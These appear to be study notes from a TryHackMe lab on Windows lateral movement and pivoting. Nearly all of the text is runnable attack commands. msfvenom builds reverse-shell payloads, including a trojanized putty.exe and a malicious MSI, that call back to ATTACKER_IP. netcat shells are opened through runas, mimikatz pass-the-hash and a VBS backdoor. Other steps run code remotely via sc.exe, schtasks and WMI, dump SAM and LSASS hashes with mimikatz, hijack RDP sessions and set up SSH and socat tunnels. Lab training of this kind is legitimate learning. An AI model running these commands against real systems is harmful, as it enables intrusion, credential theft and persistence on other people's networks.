# Lateral Movement and Pivoting
## Setup for tryhackme lab

<pre>
sudo nano /etc/resolv.conf
</pre>

and add
<pre>
nameserver 'IP'
</pre>

restart networking service
`sudo systemctl restart networking.service`

## Spawning Processes Remotely
This task will look at the available methods an attacker has to spawn a process remotely, allowing them to run commands on machines where they have valid credentials. Each of the techniques discussed uses slightly different ways to achieve the same purpose, and some of them might be a better fit for some specific scenarios.

### sc.exe

How to start service 
<pre>
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
sc.exe \\TARGET start THMservice
</pre>
The "net user" command will be executed when the service is started, creating a new local user on the system. Since the operating system is in charge of starting the service, you won't be able to look at the command output.

How to stop and delete service
<pre>
sc.exe \\TARGET stop THMservice
sc.exe \\TARGET delete THMservice
</pre>

### Creating Scheduled Tasks Remotely

<pre>
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "command/payload to execute" /sc ONCE /sd 01/01/1970 /st 00:00 

schtasks /s TARGET /run /TN "THMtask1" 

</pre>

Deletion
<pre>schtasks /S TARGET /TN "THMtask1" /DELETE /F</pre>

### Let's go
We will ssh as user

Assume we have the administrator creds

<pre>User: ZA.TRYHACKME.COM\t1_leonard.summers

Password: EZpass4ever</pre>

Create rev shell 

<pre>
msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe

smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
</pre>

Setup listener
<pre>
user@AttackBox$ msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set LHOST lateralmovement
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > set payload windows/shell/reverse_tcp
msf6 exploit(multi/handler) > exploit 

[*] Started reverse TCP handler on 10.10.10.16:4444
</pre>

Setup another listener for nc

<pre>
nc -lvp 4443
</pre>

#### Victims machine

Do the reverse shell using t1_leonard.summer's access token
<pre>
runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"
</pre>

And finally, proceed to create a new service remotely by using sc, associating it with our uploaded binary
<pre>
sc.exe \\thmiis.za.tryhackme.com create THMservice-3249 binPath= "%windir%\myservice.exe" start= auto

sc.exe \\thmiis.za.tryhackme.com start THMservice-3249
</pre>

## Moving Laterally Using WMI

Again we have admin creds

We will be using MSI packages

<pre>msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4445 -f msi > myinstaller.msi</pre>

<pre>smbclient -c 'put myinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994</pre>

Since we copied our payload to the ADMIN$ share, it will be available at C:\Windows\ on the server.

<pre>
msf6 exploit(multi/handler) > set LHOST lateralmovement
msf6 exploit(multi/handler) > set LPORT 4445
msf6 exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp
msf6 exploit(multi/handler) > exploit 
</pre>

On victim's machine Powershell
<pre>
PS C:\> $username = 't1_corine.waters';
PS C:\> $password = 'Korine.1994';
PS C:\> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
PS C:\> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
PS C:\> $Opt = New-CimSessionOption -Protocol DCOM
PS C:\> $Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
</pre>

Then run it
<pre> Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}</pre>

## Pass-the-Hash

If we got a hash instead of plain password and the system uses NTLM authentication, we ca Pass-the-hash and authenticate easily.

### Extracting NTML hashes from local SAM in mimikatz.exe

<pre>
mimikatz # privilege::debug
mimikatz # token::elevate

mimikatz # lsadump::sam   
RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 145e02c50333951f71d13c245d352b50
</pre>

### Extracting NTLM hashes from LSASS memory

<pre>
mimikatz # privilege::debug
mimikatz # token::elevate

mimikatz # sekurlsa::msv 
Authentication Id : 0 ; 308124 (00000000:0004b39c)
Session           : RemoteInteractive from 2 
User Name         : bob.jenkins
Domain            : ZA
Logon Server      : THMDC
Logon Time        : 2022/04/22 09:55:02
SID               : S-1-5-21-3330634377-1326264276-632209373-4605
        msv :
         [00000003] Primary
         * Username : bob.jenkins
         * Domain   : ZA
         * NTLM     : 6b4a57f67805a663c818106dc0648484
</pre>

We can then use the extracted hashes to perform a PtH attack by using mimikatz to inject an access token for the victim user on a reverse shell (or any other command you like) as follows:

<pre>
mimikatz # token::revert
mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
</pre>

<pre>
nc -lvp 5555
</pre>

## Abusing User Behaviour

### Backdooring  

script for .vbs <br>
`CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True`

script for .exe <br>
`msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe`

### RFP hijacking
When an administrator uses Remote Desktop to connect to a machine and closes the RDP client instead of logging off, his session will remain open on the server indefinitely. If you have SYSTEM privileges on Windows Server 2016 and earlier, you can take over any existing RDP session without requiring a password.

Run cmd as Administrator and run PsExec64.exe in tools
<pre>PsExec64.exe -s cmd.exe</pre>

Than
<pre>query user

tscon 3 /dest:rdp-tcp#6</pre>

## Port forwarding

### SSH tuneling 

<pre>useradd tunneluser -m -d /home/tunneluser -s /bin/true
passwd tunneluser</pre>

### SSH Remote Port Forwarding

<pre>ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N</pre>

<pre>xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPassword</pre>

### SSH Local Port Forwarding

<pre>ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N</pre>

setting up firewall administrative privileges are needed
<pre>netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80</pre>

`http://2.2.2.2:80`


### Port Forwarding With socat
If ssh is not available

<pre>socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389</pre>

setting firewall
<pre>netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow protocol=TCP localport=3389</pre>

If, on the other hand, we'd like to expose port 80 from the attacker's machine so that it is reachable by the server, we only need to adjust the command a bit:
<pre>socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80</pre>

### Dynamic Port Forwarding and SOCKS

<pre>ssh tunneluser@1.1.1.1 -R 9050 -N</pre>

edit `/etc/proxychains.conf`
<pre>
[ProxyList]
socks4  127.0.0.1 9050
</pre>

Than run 
<pre>proxychains curl http://pxeboot.za.tryhackme.com</pre>

